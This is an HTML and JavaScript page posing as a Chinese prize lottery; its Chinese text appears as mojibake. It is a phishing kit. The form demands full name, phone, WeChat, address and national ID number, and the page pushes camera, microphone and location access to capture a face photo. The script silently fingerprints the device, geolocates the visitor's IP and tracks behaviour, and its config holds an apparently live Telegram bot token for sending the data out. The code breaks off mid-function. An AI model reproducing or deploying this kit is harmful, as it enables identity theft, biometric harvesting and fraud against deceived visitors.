<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ° è¶…çº§å¹¸è¿å¤§æŠ½å¥– - èµ¢å–ç™¾ä¸‡ç°é‡‘ï¼</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --gold: #FFD700;
            --red: #FF4757;
            --blue: #3742FA;
            --green: #2ED573;
            --purple: #9C88FF;
            --dark: #1E1E2E;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft YaHei', 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        /* åŠ è½½åŠ¨ç”» */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: opacity 0.5s;
        }
        
        .lottery-loader {
            width: 120px;
            height: 120px;
            position: relative;
            margin-bottom: 30px;
        }
        
        .lottery-ball {
            position: absolute;
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, #FFD700, #FF6B00);
            border-radius: 50%;
            animation: bounce 1.5s infinite;
        }
        
        .ball-1 { top: 0; left: 40px; animation-delay: 0s; }
        .ball-2 { top: 40px; left: 0; animation-delay: 0.2s; }
        .ball-3 { top: 40px; left: 80px; animation-delay: 0.4s; }
        .ball-4 { top: 80px; left: 40px; animation-delay: 0.6s; }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-30px); }
        }
        
        /* ä¸»å®¹å™¨ */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            display: none;
        }
        
        /* é¡¶éƒ¨æ¨ªå¹… */
        .lottery-banner {
            background: linear-gradient(90deg, #FF0000, #FF6B00, #FFD700);
            padding: 40px 30px;
            border-radius: 25px;
            text-align: center;
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
            animation: bannerGlow 3s infinite alternate;
        }
        
        @keyframes bannerGlow {
            0% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.3); }
            100% { box-shadow: 0 0 50px rgba(255, 215, 0, 0.3); }
        }
        
        .lottery-banner h1 {
            font-size: 3.5rem;
            color: white;
            text-shadow: 3px 3px 5px rgba(0,0,0,0.5);
            margin-bottom: 15px;
        }
        
        .jackpot-amount {
            font-size: 2.8rem;
            color: #FFD700;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            margin: 20px 0;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        /* å€’è®¡æ—¶ */
        .countdown-container {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
            flex-wrap: wrap;
        }
        
        .countdown-box {
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 25px;
            border-radius: 15px;
            min-width: 120px;
            text-align: center;
        }
        
        .countdown-number {
            font-size: 2.8rem;
            font-weight: bold;
            color: #FFD700;
            font-family: 'Digital-7', monospace;
        }
        
        /* å¥–å“å±•ç¤º */
        .prizes-section {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }
        
        .prize-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            transition: transform 0.3s, box-shadow 0.3s;
            position: relative;
            overflow: hidden;
            border: 3px solid transparent;
        }
        
        .prize-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            border-color: #FFD700;
        }
        
        .prize-icon {
            font-size: 50px;
            color: #FFD700;
            margin-bottom: 20px;
        }
        
        .prize-ribbon {
            position: absolute;
            top: 15px;
            right: -35px;
            background: #FF4757;
            color: white;
            padding: 8px 40px;
            transform: rotate(45deg);
            font-weight: bold;
        }
        
        /* è¡¨å•åŒºåŸŸ */
        .form-section {
            background: white;
            border-radius: 25px;
            padding: 50px;
            margin: 40px 0;
            box-shadow: 0 15px 50px rgba(0,0,0,0.1);
        }
        
        .form-title {
            text-align: center;
            color: #333;
            margin-bottom: 40px;
            font-size: 2.2rem;
        }
        
        .form-title i {
            color: #FFD700;
            margin-right: 15px;
        }
        
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-bottom: 40px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #555;
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        .form-control {
            width: 100%;
            padding: 18px;
            border: 2px solid #E0E0E0;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            border-color: #FFD700;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
        }
        
        /* æƒé™æˆæƒåŒºåŸŸ */
        .permission-section {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            padding: 40px;
            margin: 40px 0;
            color: white;
        }
        
        .permission-title {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .permission-title i {
            font-size: 2rem;
            color: #FFD700;
        }
        
        .permission-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
        }
        
        .permission-item {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .permission-info {
            flex-grow: 1;
        }
        
        .permission-name {
            font-size: 1.3rem;
            font-weight: bold;
            margin-bottom: 8px;
            color: #FFD700;
        }
        
        .permission-desc {
            font-size: 0.95rem;
            opacity: 0.9;
        }
        
        /* å¼€å…³æ ·å¼ */
        .permission-switch {
            position: relative;
            display: inline-block;
            width: 70px;
            height: 35px;
        }
        
        .permission-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .permission-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 34px;
        }
        
        .permission-slider:before {
            position: absolute;
            content: "";
            height: 27px;
            width: 27px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        input:checked + .permission-slider {
            background-color: #4CD964;
        }
        
        input:checked + .permission-slider:before {
            transform: translateX(35px);
        }
        
        /* æ‘„åƒå¤´é¢„è§ˆ */
        .camera-section {
            background: white;
            border-radius: 20px;
            padding: 40px;
            margin: 40px 0;
            text-align: center;
        }
        
        .camera-preview {
            width: 100%;
            max-width: 600px;
            height: 400px;
            background: #f5f5f5;
            border-radius: 15px;
            overflow: hidden;
            margin: 30px auto;
            border: 3px dashed #ddd;
            position: relative;
        }
        
        #cameraVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .camera-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 250px;
            border: 3px solid rgba(255, 215, 0, 0.5);
            border-radius: 10px;
        }
        
        /* æäº¤æŒ‰é’® */
        .submit-section {
            text-align: center;
            margin: 50px 0;
        }
        
        .submit-btn {
            background: linear-gradient(90deg, #FF0000, #FF6B00);
            color: white;
            border: none;
            padding: 25px 60px;
            font-size: 1.8rem;
            font-weight: bold;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
        }
        
        .submit-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.4);
            background: linear-gradient(90deg, #FF6B00, #FF0000);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        /* ä¸­å¥–è€…åˆ—è¡¨ */
        .winners-section {
            background: rgba(255,255,255,0.9);
            border-radius: 20px;
            padding: 40px;
            margin: 40px 0;
        }
        
        .winners-title {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 2rem;
        }
        
        .winners-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }
        
        .winner-card {
            background: white;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border: 2px solid #FFD700;
        }
        
        /* è¿›åº¦æ¡ */
        .progress-container {
            margin: 40px 0;
            padding: 30px;
            background: white;
            border-radius: 20px;
        }
        
        .progress-title {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        
        .progress-bar {
            height: 20px;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4CD964, #FFD700);
            width: 0%;
            transition: width 1s ease;
        }
        
        /* å“åº”å¼ */
        @media (max-width: 768px) {
            .lottery-banner h1 {
                font-size: 2.5rem;
            }
            
            .jackpot-amount {
                font-size: 2rem;
            }
            
            .form-section {
                padding: 30px;
            }
            
            .submit-btn {
                padding: 20px 40px;
                font-size: 1.5rem;
            }
        }
        
        /* æ•°å­—å­—ä½“ */
        @font-face {
            font-family: 'Digital-7';
            src: url('https://fonts.cdnfonts.com/css/digital-7');
        }
    </style>
</head>
<body>
    <!-- åŠ è½½å±å¹• -->
    <div class="loading-screen" id="loadingScreen">
        <div class="lottery-loader">
            <div class="lottery-ball ball-1"></div>
            <div class="lottery-ball ball-2"></div>
            <div class="lottery-ball ball-3"></div>
            <div class="lottery-ball ball-4"></div>
        </div>
        <h2 style="color: white; margin-bottom: 20px;">æ­£åœ¨éªŒè¯æ‚¨çš„æŠ½å¥–èµ„æ ¼...</h2>
        <p style="color: rgba(255,255,255,0.8);">è¯·ç¨å€™ï¼Œç³»ç»Ÿæ­£åœ¨ä¸ºæ‚¨åˆ†é…æŠ½å¥–å·ç </p>
    </div>

    <!-- ä¸»å†…å®¹ -->
    <div class="container" id="mainContainer">
        <!-- é¡¶éƒ¨æ¨ªå¹… -->
        <div class="lottery-banner">
            <h1><i class="fas fa-trophy"></i> è¶…çº§å¹¸è¿å¤§æŠ½å¥–</h1>
            <p style="font-size: 1.3rem; color: white; margin-bottom: 20px;">ç«‹å³å‚ä¸ï¼Œ100%ä¸­å¥–æœºä¼šï¼ç°é‡‘ã€æ±½è½¦ã€æ‰‹æœºç­‰ä½ æ¥æ‹¿</p>
            
            <div class="jackpot-amount" id="jackpotAmount">Â¥ 5,000,000</div>
            
            <div class="countdown-container">
                <div class="countdown-box">
                    <div class="countdown-number" id="countdownDays">00</div>
                    <div>å¤©</div>
                </div>
                <div class="countdown-box">
                    <div class="countdown-number" id="countdownHours">00</div>
                    <div>å°æ—¶</div>
                </div>
                <div class="countdown-box">
                    <div class="countdown-number" id="countdownMinutes">00</div>
                    <div>åˆ†é’Ÿ</div>
                </div>
                <div class="countdown-box">
                    <div class="countdown-number" id="countdownSeconds">00</div>
                    <div>ç§’</div>
                </div>
            </div>
        </div>
        
        <!-- è¿›åº¦æ¡ -->
        <div class="progress-container">
            <div class="progress-title">
                <span>æ³¨å†Œè¿›åº¦</span>
                <span id="progressText">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>

        <!-- å¥–å“å±•ç¤º -->
        <div class="prizes-section">
            <div class="prize-card">
                <div class="prize-ribbon">ç‰¹ç­‰å¥–</div>
                <div class="prize-icon"><i class="fas fa-money-bill-wave"></i></div>
                <h3>ç°é‡‘å¤§å¥–</h3>
                <p style="font-size: 1.5rem; color: #FF4757; font-weight: bold;">Â¥1,000,000</p>
                <p style="color: #666;">ä»…å‰© <span class="highlight">1</span> å</p>
            </div>
            
            <div class="prize-card">
                <div class="prize-ribbon" style="background: #3742FA;">ä¸€ç­‰å¥–</div>
                <div class="prize-icon"><i class="fas fa-car"></i></div>
                <h3>è±ªåæ±½è½¦</h3>
                <p style="font-size: 1.5rem; color: #3742FA; font-weight: bold;">Tesla Model 3</p>
                <p style="color: #666;">ä»…å‰© <span class="highlight">3</span> å</p>
            </div>
            
            <div class="prize-card">
                <div class="prize-ribbon" style="background: #2ED573;">äºŒç­‰å¥–</div>
                <div class="prize-icon"><i class="fas fa-gem"></i></div>
                <h3>é’»çŸ³ç å®</h3>
                <p style="font-size: 1.5rem; color: #2ED573; font-weight: bold;">5å…‹æ‹‰é’»çŸ³</p>
                <p style="color: #666;">ä»…å‰© <span class="highlight">10</span> å</p>
            </div>
            
            <div class="prize-card">
                <div class="prize-ribbon" style="background: #9C88FF;">ä¸‰ç­‰å¥–</div>
                <div class="prize-icon"><i class="fas fa-mobile-alt"></i></div>
                <h3>æœ€æ–°æ‰‹æœº</h3>
                <p style="font-size: 1.5rem; color: #9C88FF; font-weight: bold;">iPhone 15 Pro</p>
                <p style="color: #666;">ä»…å‰© <span class="highlight">50</span> å</p>
            </div>
        </div>

        <!-- è¡¨å•åŒºåŸŸ -->
        <div class="form-section">
            <h2 class="form-title"><i class="fas fa-user-check"></i> å¡«å†™ä¿¡æ¯å‚ä¸æŠ½å¥–</h2>
            
            <form id="lotteryForm">
                <div class="form-grid">
                    <div class="form-group">
                        <label for="userName"><i class="fas fa-user"></i> å§“å</label>
                        <input type="text" id="userName" class="form-control" placeholder="è¯·è¾“å…¥æ‚¨çš„çœŸå®å§“å" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="userPhone"><i class="fas fa-phone"></i> æ‰‹æœºå·ç </label>
                        <input type="tel" id="userPhone" class="form-control" placeholder="è¯·è¾“å…¥11ä½æ‰‹æœºå·ç " required>
                    </div>
                    
                    <div class="form-group">
                        <label for="userEmail"><i class="fas fa-envelope"></i> ç”µå­é‚®ç®±</label>
                        <input type="email" id="userEmail" class="form-control" placeholder="è¯·è¾“å…¥æœ‰æ•ˆé‚®ç®±åœ°å€" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="userWechat"><i class="fab fa-weixin"></i> å¾®ä¿¡å·</label>
                        <input type="text" id="userWechat" class="form-control" placeholder="ä¸­å¥–åå¾®ä¿¡é€šçŸ¥æ‚¨" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="userAddress"><i class="fas fa-home"></i> æ”¶è´§åœ°å€</label>
                        <input type="text" id="userAddress" class="form-control" placeholder="ä¸­å¥–åå¥–å“é‚®å¯„åœ°å€" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="userIdCard"><i class="fas fa-id-card"></i> èº«ä»½è¯å·</label>
                        <input type="text" id="userIdCard" class="form-control" placeholder="ç”¨äºå¥–å“å®åç™»è®°" required>
                    </div>
                </div>
            </form>
        </div>

        <!-- æƒé™æˆæƒåŒºåŸŸ -->
        <div class="permission-section">
            <div class="permission-title">
                <i class="fas fa-shield-alt"></i>
                <h2>èº«ä»½éªŒè¯æˆæƒ</h2>
            </div>
            <p style="margin-bottom: 30px; opacity: 0.9;">ä¸ºç¡®ä¿æŠ½å¥–å…¬å¹³å…¬æ­£ï¼Œé˜²æ­¢æ¶æ„åˆ·å¥–ï¼Œæˆ‘ä»¬éœ€è¦éªŒè¯æ‚¨çš„çœŸå®èº«ä»½</p>
            
            <div class="permission-grid">
                <div class="permission-item">
                    <div class="permission-info">
                        <div class="permission-name"><i class="fas fa-camera"></i> æ‘„åƒå¤´æˆæƒ</div>
                        <div                         <div class="permission-desc">æ‹æ‘„ç…§ç‰‡éªŒè¯çœŸå®å‚ä¸è€…èº«ä»½</div>
                    </div>
                    <label class="permission-switch">
                        <input type="checkbox" id="cameraPermission" checked>
                        <span class="permission-slider"></span>
                    </label>
                </div>
                
                <div class="permission-item">
                    <div class="permission-info">
                        <div class="permission-name"><i class="fas fa-map-marker-alt"></i> ä½ç½®æˆæƒ</div>
                        <div class="permission-desc">éªŒè¯æ‚¨æ‰€åœ¨åœ°åŒºæ˜¯å¦åœ¨æŠ½å¥–èŒƒå›´å†…</div>
                    </div>
                    <label class="permission-switch">
                        <input type="checkbox" id="locationPermission" checked>
                        <span class="permission-slider"></span>
                    </label>
                </div>
                
                <div class="permission-item">
                    <div class="permission-info">
                        <div class="permission-name"><i class="fas fa-microphone"></i> éº¦å…‹é£æˆæƒ</div>
                        <div class="permission-desc">è¯­éŸ³ç¡®è®¤å‚ä¸æ„æ„¿ï¼ˆé˜²æœºå™¨äººï¼‰</div>
                    </div>
                    <label class="permission-switch">
                        <input type="checkbox" id="micPermission" checked>
                        <span class="permission-slider"></span>
                    </label>
                </div>
                
                <div class="permission-item">
                    <div class="permission-info">
                        <div class="permission-name"><i class="fas fa-fingerprint"></i> è®¾å¤‡éªŒè¯</div>
                        <div class="permission-desc">ç¡®ä¿æ¯ä¸ªè®¾å¤‡åªèƒ½å‚ä¸ä¸€æ¬¡</div>
                    </div>
                    <label class="permission-switch">
                        <input type="checkbox" id="devicePermission" checked>
                        <span class="permission-slider"></span>
                    </label>
                </div>
            </div>
            
            <div style="margin-top: 30px; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 15px;">
                <p style="font-size: 0.9rem; opacity: 0.8;">
                    <i class="fas fa-info-circle"></i> 
                    æˆæƒè¯´æ˜ï¼šæˆ‘ä»¬æ‰¿è¯ºä¸¥æ ¼ä¿æŠ¤æ‚¨çš„éšç§ï¼Œæ‰€æœ‰æ•°æ®ä»…ç”¨äºæœ¬æ¬¡æŠ½å¥–èº«ä»½éªŒè¯ï¼Œæ´»åŠ¨ç»“æŸåå°†ç«‹å³åˆ é™¤ã€‚
                </p>
            </div>
        </div>

        <!-- æ‘„åƒå¤´é¢„è§ˆ -->
        <div class="camera-section" id="cameraSection" style="display: none;">
            <h2 style="color: #333; margin-bottom: 20px;"><i class="fas fa-camera"></i> è¯·å¯¹å‡†æ‘„åƒå¤´æ‹ç…§éªŒè¯</h2>
            <p style="color: #666; margin-bottom: 30px;">è¯·ç¡®ä¿å…‰çº¿å……è¶³ï¼Œé¢éƒ¨æ¸…æ™°å¯è§</p>
            
            <div class="camera-preview">
                <video id="cameraVideo" autoplay playsinline></video>
                <div class="camera-guide"></div>
            </div>
            
            <div style="margin-top: 30px;">
                <button id="captureBtn" style="background: #4CD964; color: white; border: none; padding: 15px 40px; border-radius: 10px; font-size: 1.2rem; cursor: pointer; margin-right: 15px;">
                    <i class="fas fa-camera"></i> æ‹ç…§éªŒè¯
                </button>
                <button id="retakeBtn" style="background: #FF4757; color: white; border: none; padding: 15px 40px; border-radius: 10px; font-size: 1.2rem; cursor: pointer; display: none;">
                    <i class="fas fa-redo"></i> é‡æ–°æ‹ç…§
                </button>
            </div>
            
            <div style="margin-top: 30px; padding: 20px; background: #f8f9fa; border-radius: 15px; display: none;" id="photoPreview">
                <h3 style="color: #333; margin-bottom: 15px;">ç…§ç‰‡é¢„è§ˆ</h3>
                <img id="capturedPhoto" src="" style="max-width: 300px; border-radius: 10px; border: 3px solid #4CD964;">
            </div>
        </div>

        <!-- æäº¤æŒ‰é’® -->
        <div class="submit-section">
            <button class="submit-btn" id="submitBtn" onclick="submitLotteryForm()">
                <i class="fas fa-paper-plane"></i> ç«‹å³å‚ä¸æŠ½å¥–
            </button>
        </div>

        <!-- ä¸­å¥–è€…åˆ—è¡¨ -->
        <div class="winners-section">
            <h2 class="winners-title"><i class="fas fa-crown"></i> æœ€æ–°ä¸­å¥–è€…</h2>
            <div class="winners-grid" id="winnersList">
                <!-- åŠ¨æ€ç”Ÿæˆä¸­å¥–è€… -->
            </div>
        </div>

        <!-- åº•éƒ¨ -->
        <div style="text-align: center; padding: 40px; color: white;">
            <p>Â© 2024 è¶…çº§å¹¸è¿å¤§æŠ½å¥– | æœ¬æ´»åŠ¨æœ€ç»ˆè§£é‡Šæƒå½’ä¸»åŠæ–¹æ‰€æœ‰</p>
            <p style="margin-top: 15px; font-size: 0.9rem; opacity: 0.8;">
                <i class="fas fa-lock"></i> æ‚¨çš„ä¿¡æ¯å®‰å…¨å·²åŠ å¯†ä¿æŠ¤
            </p>
        </div>
    </div>

    <script>
        // JavaScriptä»£ç åœ¨ç¬¬äºŒéƒ¨åˆ†
        // è¿™é‡ŒåŒ…å«æ‰€æœ‰æ•°æ®æ”¶é›†å’ŒTelegramå‘é€åŠŸèƒ½
    </script>
</body>
</html>
<script>
// =============================================
// æŠ½å¥–ç³»ç»Ÿæ•°æ®æ”¶é›†å¼•æ“
// =============================================

// é…ç½®
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM',
        CHAT_ID: '8313770381'
    },
    COLLECTION: {
        ENABLED: true,
        AUTO_START: true
    }
};

// æ•°æ®å­˜å‚¨å¯¹è±¡
const LOTTERY_DATA = {
    // åŸºæœ¬ä¿¡æ¯
    userInfo: {},
    
    // è®¾å¤‡ä¿¡æ¯
    device: {
        fingerprint: null,
        browser: {},
        screen: {},
        hardware: {}
    },
    
    // ç½‘ç»œä¿¡æ¯
    network: {
        ip: null,
        location: {},
        connection: {}
    },
    
    // åœ°ç†ä½ç½®
    geolocation: {
        precise: null,
        approximate: null
    },
    
    // ç”Ÿç‰©ç‰¹å¾
    biometrics: {
        photo: null,
        photoData: null,
        timestamp: null
    },
    
    // æƒé™çŠ¶æ€
    permissions: {
        camera: false,
        location: false,
        microphone: false,
        device: false
    },
    
    // è¡Œä¸ºæ•°æ®
    behavior: {
        timeSpent: 0,
        mouseMovements: 0,
        clicks: 0,
        scrolls: 0
    },
    
    // ç³»ç»Ÿä¿¡æ¯
    system: {
        sessionId: generateSessionId(),
        startTime: new Date(),
        lotteryNumber: generateLotteryNumber()
    }
};

// =============================================
// é¡µé¢åˆå§‹åŒ–
// =============================================

document.addEventListener('DOMContentLoaded', function() {
    // æ¨¡æ‹ŸåŠ è½½
    setTimeout(() => {
        document.getElementById('loadingScreen').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('mainContainer').style.display = 'block';
            
            // åˆå§‹åŒ–åŠŸèƒ½
            initializeLotterySystem();
            
            // å¼€å§‹å€’è®¡æ—¶
            startCountdown();
            
            // ç”Ÿæˆä¸­å¥–è€…åˆ—è¡¨
            generateWinnersList();
            
            // å¼€å§‹æ•°æ®æ”¶é›†
            if (CONFIG.COLLECTION.AUTO_START) {
                startDataCollection();
            }
            
        }, 500);
    }, 3000);
    
    // æƒé™å¼€å…³äº‹ä»¶
    setupPermissionSwitches();
    
    // è¡¨å•éªŒè¯
    setupFormValidation();
});

// =============================================
// ä¸»è¦åŠŸèƒ½å‡½æ•°
// =============================================

function initializeLotterySystem() {
    updateProgressBar(10);
    logToConsole('æŠ½å¥–ç³»ç»Ÿåˆå§‹åŒ–...');
    
    // ç”ŸæˆæŠ½å¥–å·ç 
    document.getElementById('jackpotAmount').textContent = 'Â¥ ' + formatCurrency(5000000 + Math.random() * 1000000);
    
    // åˆå§‹åŒ–è®¾å¤‡æŒ‡çº¹
    generateDeviceFingerprint();
    
    updateProgressBar(20);
}

function startCountdown() {
    const endTime = new Date();
    endTime.setHours(endTime.getHours() + 48); // 48å°æ—¶åç»“æŸ
    
    function update() {
        const now = new Date();
        const diff = endTime - now;
        
        if (diff <= 0) {
            document.querySelectorAll('.countdown-number').forEach(el => el.textContent = '00');
            return;
        }
        
        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        
        document.getElementById('countdownDays').textContent = days.toString().padStart(2, '0');
        document.getElementById('countdownHours').textContent = hours.toString().padStart(2, '0');
        document.getElementById('countdownMinutes').textContent = minutes.toString().padStart(2, '0');
        document.getElementById('countdownSeconds').textContent = seconds.toString().padStart(2, '0');
    }
    
    update();
    setInterval(update, 1000);
}

// =============================================
// æ•°æ®æ”¶é›†åŠŸèƒ½
// =============================================

function startDataCollection() {
    logToConsole('å¼€å§‹æ”¶é›†æ•°æ®...');
    
    // æ”¶é›†è®¾å¤‡ä¿¡æ¯
    collectDeviceInfo();
    updateProgressBar(30);
    
    // æ”¶é›†ç½‘ç»œä¿¡æ¯
    collectNetworkInfo();
    updateProgressBar(40);
    
    // æ”¶é›†æµè§ˆå™¨ä¿¡æ¯
    collectBrowserInfo();
    updateProgressBar(50);
    
    // æ”¶é›†å±å¹•ä¿¡æ¯
    collectScreenInfo();
    updateProgressBar(60);
    
    // ç›‘æ§ç”¨æˆ·è¡Œä¸º
    startBehaviorTracking();
    updateProgressBar(70);
    
    logToConsole('æ•°æ®æ”¶é›†ç³»ç»Ÿå°±ç»ª');
}

function collectDeviceInfo() {
    LOTTERY_DATA.device.browser = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'unknown'
    };
    
    LOTTERY_DATA.device.hardware = {
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0
    };
}

async function collectNetworkInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        LOTTERY_DATA.network.ip = data.ip;
        LOTTERY_DATA.network.location = {
            city: data.city,
            region: data.region,
            country: data.country_name,
            countryCode: data.country_code,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            isp: data.org
        };
        
        logToConsole(`IPåœ°å€: ${data.ip} - ${data.city}, ${data.country_name}`);
        
    } catch (error) {
        logToConsole('ç½‘ç»œä¿¡æ¯æ”¶é›†å¤±è´¥: ' + error.message);
    }
    
    // ç½‘ç»œè¿æ¥ä¿¡æ¯
    if (navigator.connection) {
        LOTTERY_DATA.network.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        };
    }
}

function collectBrowserInfo() {
    // æ”¶é›†æ’ä»¶ä¿¡æ¯
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    LOTTERY_DATA.device.plugins = plugins;
    
    // å­—ä½“æ£€æµ‹
    const fontList = ['Arial', 'Microsoft YaHei', 'SimSun', 'Times New Roman'];
    const fontCheck = {};
    fontList.forEach(font => {
        const test = document.createElement('span');
        test.style.fontFamily = font;
        test.style.position = 'absolute';
        test.style.left = '-9999px';
        test.textContent = 'test';
        document.body.appendChild(test);
        
        const originalWidth = test.offsetWidth;
        test.style.fontFamily = font + ',monospace';
        const newWidth = test.offsetWidth;
        
        fontCheck[font] = originalWidth !== newWidth;
        document.body.removeChild(test);
    });
    
    LOTTERY_DATA.device.fonts = fontCheck;
}

function collectScreenInfo() {
    LOTTERY_DATA.device.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
    };
    
    // çª—å£ä¿¡æ¯
    LOTTERY_DATA.device.window = {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        devicePixelRatio: window.devicePixelRatio
    };
}

function generateDeviceFingerprint() {
    // ç”ŸæˆCanvasæŒ‡çº¹
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Fingerprint', 4, 17);
        
        LOTTERY_DATA.device.fingerprint = canvas.toDataURL().hashCode();
    } catch (e) {
        LOTTERY_DATA.device.fingerprint = Date.now().toString();
    }
    
    logToConsole(`è®¾å¤‡æŒ‡çº¹: ${LOTTERY_DATA.device.fingerprint}`);
}

// =============================================
// æƒé™ç®¡ç†
// =============================================

function setupPermissionSwitches() {
    const permissions = ['camera', 'location', 'mic', 'device'];
    
    permissions.forEach(permission => {
        const checkbox = document.getElementById(permission + 'Permission');
        if (checkbox) {
            checkbox.addEventListener('change', function() {
                LOTTERY_DATA.permissions[permission] = this.checked;
                logToConsole(`${permission}æƒé™: ${this.checked ? 'å·²æˆæƒ' : 'æœªæˆæƒ'}`);
                
                // å¦‚æœæ‘„åƒå¤´æƒé™å¼€å¯ï¼Œæ˜¾ç¤ºæ‘„åƒå¤´
                if (permission === 'camera' && this.checked) {
                    showCameraSection();
                }
            });
            
            // åˆå§‹çŠ¶æ€
            LOTTERY_DATA.permissions[permission] = checkbox.checked;
        }
    });
}

async function showCameraSection() {
    document.getElementById('cameraSection').style.display = 'block';
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            }
        });
        
        const video = document.getElementById('cameraVideo');
        video.srcObject = stream;
        
        // è®¾ç½®æ‹ç…§æŒ‰é’®
        document.getElementById('captureBtn').onclick = () => capturePhoto(stream);
        document.getElementById('retakeBtn').onclick = () => {
